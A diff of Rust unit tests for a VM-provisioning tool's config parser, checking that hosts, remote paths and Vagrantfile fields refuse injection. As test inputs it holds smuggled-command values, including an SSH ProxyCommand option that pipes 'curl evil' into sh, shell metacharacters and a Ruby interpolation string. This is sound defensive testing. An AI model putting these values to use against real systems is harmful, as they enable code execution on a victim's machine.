         let sources = HostSources {
             env: Some("  "),
@@ -1430,7 +1144,7 @@ mod tests {
         // `--host` has to work on a machine whose per-developer
         // file is missing, unreadable or malformed -- that is
         // half the point of having a flag.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         std::fs::write(dir.path().join(USER_CONFIG_FILE), "host = ").unwrap();
         let sources = HostSources {
             flag: Some("mine"),
@@ -1445,7 +1159,7 @@ mod tests {
         // Same rule as the overlay: a typo in a file nobody
         // reads twice must be an error, not a setting that does
         // nothing.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         std::fs::write(dir.path().join(USER_CONFIG_FILE), "hsot = \"x\"\n")
             .unwrap();
         let sources = HostSources {
@@ -1461,7 +1175,7 @@ mod tests {
     fn a_user_config_without_a_host_is_not_a_host() {
         // The file exists and parses but names nothing, which
         // must read the same as no file at all.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         std::fs::write(dir.path().join(USER_CONFIG_FILE), "\n").unwrap();
         let sources = HostSources {
             user_config_dir: Some(dir.path()),
@@ -1475,13 +1189,13 @@ mod tests {
 
     #[test]
     fn a_host_from_the_environment_is_still_validated() {
-        // The charset check used to guard a repo-supplied value.
-        // It now guards the argv instead: every remaining source
-        // reaches `ssh` as its first argument, and a mistake can
-        // fill any of them in. The file sources are covered by
+        // The charset check protects the argv, not the repo: every
+        // source that can still supply a host reaches `ssh` as
+        // its first argument, and a mistake fills any of them
+        // in. The file sources are covered by
         // `an_invalid_host_names_the_source_that_supplied_it`;
         // this is the environment, which no file check reaches.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         let sources = HostSources {
             env: Some("-oProxyCommand=x"),
             ..user_sources(dir.path())
@@ -1605,7 +1319,7 @@ mod tests {
         let (_dir, loaded) = load_with_overlay("host = \"-oProxyCommand=x\"");
         let err = loaded.unwrap_err();
         assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
-        // And the message names the file holding the value.
+        // And the message identifies the file holding the value.
         assert!(err.to_string().contains("bombyx.local.toml"), "{err}");
     }
 
@@ -1738,131 +1452,35 @@ mod tests {
     }
 
     #[test]
-    fn rejects_empty_remote_root() {
-        let src = "project = \"p\"\nremote_root = \"\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(
-            err,
-            ConfigError::Empty {
-                field: "remote_root"
-            }
-        ));
-    }
-
-    #[test]
-    fn rejects_a_host_that_is_an_ssh_option() {
-        // The headline case: a cloned repo must not be able
-        // to run code on this workstation.
-        let err = parse_with_host("-oProxyCommand=curl evil|sh").unwrap_err();
-        assert!(matches!(err, ConfigError::Invalid { field: "host", .. }));
-        assert!(err.to_string().contains("option"));
-    }
-
-    #[test]
-    fn rejects_a_host_with_shell_metacharacters() {
-        for host in ["a;id", "a$(id)", "a b", "a`id`", "a/b"] {
+    fn a_bad_remote_root_in_toml_surfaces_as_a_field_error() {
+        // Every `remote_root` rule, and the tests enumerating
+        // the family it refuses, live in `config::root`. What
+        // this covers is the seam: a value refused there has to
+        // come back out of `Config::parse` naming the field, so
+        // an operator is told which key to edit.
+        for (root, want) in [
+            ("", "must not be empty"),
+            ("vms", "must start with"),
+            ("~vms", "must start with"),
+            ("/.", "`.` segment"),
+            ("~", "at least 1 directory"),
+        ] {
+            let src = format!("project = \"p\"\nremote_root = \"{root}\"\n");
+            let err = parse(&src).unwrap_err();
             assert!(
-                parse_with_host(host).is_err(),
-                "host {host:?} must be rejected"
+                matches!(
+                    &err,
+                    ConfigError::Empty {
+                        field: "remote_root"
+                    } | ConfigError::Invalid {
+                        field: "remote_root",
+                        ..
+                    }
+                ),
+                "remote_root {root:?} must be refused, got {err:?}"
             );
+            assert!(err.to_string().contains(want), "{root:?}: {err}");
         }
-    }
-
-    #[test]
-    fn rejects_a_remote_root_with_shell_metacharacters() {
-        let src = "project = \"p\"\n\
-                   remote_root = \"~/vms; curl evil|sh #\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(matches!(
-            err,
-            ConfigError::Invalid {
-                field: "remote_root",
-                ..
-            }
-        ));
-    }
-
-    /// Asserts `remote_root` is refused as an invalid field.
-    fn assert_root_rejected(root: &str) {
-        let src = format!("project = \"p\"\nremote_root = {root:?}\n");
-        let err = parse(&src).unwrap_err();
-        assert!(
-            matches!(
-                err,
-                ConfigError::Invalid {
-                    field: "remote_root",
-                    ..
-                }
-            ),
-            "remote_root {root:?} must be rejected, got {err}"
-        );
-    }
-
-    #[test]
-    fn rejects_a_traversal_segment_in_remote_root() {
-        // `rm -rf` on a teardown path would otherwise escape the
-        // configured root: `remote_root = "~/.."` with
-        // `project = "igor"` targets the whole home directory.
-        for root in ["~/..", "/srv/../..", "~/vms/../other"] {
-            assert_root_rejected(root);
-        }
-    }
-
-    #[test]
-    fn rejects_a_single_dot_segment_in_remote_root() {
-        // A `.` adds a segment without adding depth. This was
-        // the hole in the first version of the guard: `"/."`
-        // with `project = "etc"` looked two segments deep and
-        // resolved to `/etc`.
-        for root in ["/.", "~/.", "/././etc", "~/./x", "~/vms/."] {
-            assert_root_rejected(root);
-        }
-    }
-
-    #[test]
-    fn rejects_an_unrooted_remote_root() {
-        // A relative root resolves against the SSH login
-        // directory, which makes the depth check meaningless.
-        for root in ["..", ".", "vms", "vms/deep"] {
-            assert_root_rejected(root);
-        }
-    }
-
-    #[test]
-    fn rejects_a_remote_root_with_no_real_depth() {
-        // `/` or `~` would put the project directory -- which
-        // bombyx creates, writes into, and deletes -- at the top
-        // level or directly in the home directory.
-        for root in ["/", "~", "~/", "//", "///"] {
-            assert_root_rejected(root);
-        }
-    }
-
-    #[test]
-    fn accepts_rooted_remote_roots_of_real_depth() {
-        // The dotted name is the important one: the check is per
-        // segment, not a substring search.
-        for root in ["~/vms", "~/vms.d", "/srv/vms", "/srv/vms/deep", "~/v/"] {
-            let src = format!("project = \"p\"\nremote_root = {root:?}\n");
-            assert!(parse(&src).is_ok(), "remote_root {root:?} must parse");
-        }
-    }
-
-    #[test]
-    fn path_segments_measures_depth_not_characters() {
-        assert_eq!(path_segments("~/vms/myproject"), vec!["vms", "myproject"]);
-        assert_eq!(path_segments("//x//y"), vec!["x", "y"]);
-        assert_eq!(path_segments("~"), Vec::<&str>::new());
-        // `.` is kept, so a caller can reject it.
-        assert_eq!(path_segments("~/./x"), vec![".", "x"]);
-    }
-
-    #[test]
-    fn rejects_a_non_leading_tilde_in_remote_root() {
-        let src = "project = \"p\"\n\
-                   remote_root = \"/srv/~igor\"\n";
-        let err = parse(src).unwrap_err();
-        assert!(err.to_string().contains("first character"));
     }
 
     #[test]
@@ -1966,5 +1584,164 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let err = load(dir.path(), &flag_sources("vmhost")).unwrap_err();
         assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
+    }
+
+    /// A project file carrying every required section.
+    ///
+    /// Tests that exercise one bad field start from this and
+    /// replace a line, so a failure names the field under test
+    /// rather than a section someone forgot.
+    fn full_toml() -> String {
+        // The shared tables with `cpus`/`memory` raised, so a
+        // test varying one can tell its value from the default.
+        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
+            .replace("cpus = 2", "cpus = 4")
+            .replace("memory = 2048", "memory = 8192")
+    }
+
+    fn parse_full(source: &str) -> Result<Config, ConfigError> {
+        Config::parse(source, Path::new("bombyx.toml"), "vmhost")
+    }
+
+    #[test]
+    fn parses_the_vm_and_source_sections() {
+        let cfg = parse_full(&full_toml()).unwrap();
+        assert_eq!(cfg.vm.provider, Provider::Libvirt);
+        assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
+        assert_eq!(cfg.vm.cpus, 4);
+        assert_eq!(cfg.vm.memory, 8192);
+        assert_eq!(
+            cfg.source.repo.as_str(),
+            "https://example.invalid/myproject.git"
+        );
+        assert_eq!(cfg.source.git_ref, "main");
+        assert_eq!(cfg.source.script.as_str(), "vagrant/provision.sh");
+    }
+
+    #[test]
+    fn requires_both_new_sections() {
+        // Neither has a defensible default. A box is the one
+        // thing bombyx cannot invent, and a repository bombyx
+        // guessed at would be cloned into the guest and run as
+        // root.
+        //
+        // One table removed at a time, and the loop below skips
+        // only the named one. Building the input with
+        // `take_while` instead would truncate the file at that
+        // header, so removing `[vm]` would drop `[source]` too
+        // and neither case would be isolated.
+        for missing in ["[vm]", "[source]"] {
+            let mut source = String::new();
+            let mut skipping = false;
+            for line in full_toml().lines() {
+                if line.starts_with('[') {
+                    skipping = line.starts_with(missing);
+                }
+                if !skipping {
+                    source.push_str(line);
+                    source.push('\n');
+                }
+            }
+            assert!(
+                source.contains(if missing == "[vm]" {
+                    "[source]"
+                } else {
+                    "[vm]"
+                }),
+                "only {missing} may be removed"
+            );
+            let err = parse_full(&source).unwrap_err();
+            assert!(
+                matches!(err, ConfigError::Parse { .. }),
+                "a file without {missing} must be refused: {err:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_an_unknown_provider() {
+        // Failing at parse rather than at boot: an unknown
+        // provider renders a Vagrantfile no vagrant can use,
+        // and the error would arrive on the VM host after a
+        // push has already changed state.
+        let source = full_toml().replace("libvirt", "virtualbox");
+        let err = parse_full(&source).unwrap_err();
+        assert!(matches!(err, ConfigError::Parse { .. }), "{err:?}");
+    }
+
+    #[test]
+    fn rejects_a_machine_with_nothing_to_run_on() {
+        // One field at a time, so a guard covering only `cpus`
+        // cannot pass by way of the `memory` case.
+        for (field, from, to) in [
+            ("cpus", "cpus = 4", "cpus = 0"),
+            ("memory", "memory = 8192", "memory = 0"),
+        ] {
+            let source = full_toml().replace(from, to);
+            let err = parse_full(&source).unwrap_err();
+            assert!(
+                matches!(&err, ConfigError::Invalid { field: f, .. }
+                    if *f == field),
+                "{field}: {err:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_characters_that_would_break_the_generated_file() {
+        // These four fields are rendered into a Ruby file. The
+        // whole family: a quote closes the literal early, a
+        // backslash starts an escape, a control character is
+        // never meant, and `#{}` is Ruby interpolation, which
+        // is evaluated rather than printed.
+        for field in ["box", "repo", "ref", "script"] {
+            // `{bad:?}` renders a Rust literal, which is a valid
+            // TOML basic string for these three. A control
+            // character is not: Rust and TOML spell an escape
+            // for one differently, so that case would fail as
+            // a parse error before reaching the guard. It is
+            // covered directly in `config::vm`'s tests instead.
+            for (bad, reason) in [
+                ("a\"b", "would end or escape"),
+                ("a\\b", "would end or escape"),
+                ("a#{1}b", "Ruby interpolation"),
+            ] {
+                let source: String = full_toml()
+                    .lines()
+                    .map(|l| {
+                        if l.starts_with(&format!("{field} = ")) {
+                            format!("{field} = {bad:?}\n")
+                        } else {
+                            format!("{l}\n")
+                        }
+                    })
+                    .collect();
+                // The substitution has to have happened, or this
+                // loop would assert nothing at all.
+                assert!(
+                    source.contains(&format!("{field} = ")),
+                    "{field} is not a key in the fixture"
+                );
+                // The message is asserted, not the variant,
+                // because the two differ by field. `repo` and
+                // `script` are newtypes checked while serde
+                // deserializes, so a bad one arrives wrapped as
+                // `Parse`, which also names the line. `box` and
+                // `ref` are checked after parsing, as `Invalid`.
+                // Both spellings carry the field and the reason.
+                //
+                // The reason has to be asserted as well as the
+                // field. `toml` backticks field names in its own
+                // messages, so a field-only check also passes on
+                // `missing field` or `unknown field` -- and then
+                // this test would go green on a fixture that had
+                // drifted, while proving nothing about the guard.
+                let err = parse_full(&source).unwrap_err().to_string();
+                assert!(
+                    err.contains(&format!("`{field}`")) && err.contains(reason),
+                    "{field} must refuse {bad:?} with {reason:?}, got {err}"
+                );
+            }
+        }
     }
 }
